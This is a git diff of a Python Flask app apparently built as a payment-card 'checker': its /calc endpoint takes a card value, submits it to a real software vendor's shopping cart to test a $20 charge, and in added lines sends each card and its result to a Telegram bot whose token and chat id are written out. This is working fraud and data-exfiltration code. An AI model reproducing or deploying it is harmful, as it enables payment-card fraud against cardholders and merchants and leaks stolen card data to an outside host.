@@ -15,7 +15,6 @@ def home():
 @app.route("/calc", methods=["GET"])
 def chk():
 	g = request.args.get("cc")
-	requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={a}|{result}')
 	url = "https://shop.superantispyware.com/sas/carts/"
 	
 	headers = {
@@ -89,6 +88,8 @@ def chk():
 	response = requests.post(url, data=payload, headers=headers)
 	try:
 		result=response.text.split('class="message">')[1].split('</div>')[0].split('>')[1].split('\n')[0]
+		requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={g}|{result}')
+	
 		return ({
            'card': g,
            'amount': '20$',
@@ -96,6 +97,7 @@ def chk():
             "result": result
         })
 	except:
+		requests.get(f'https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage?chat_id=6689099522&text={g}|charge authnet ✅')
 		return ({
            'card': g,
            'amount': '20$',
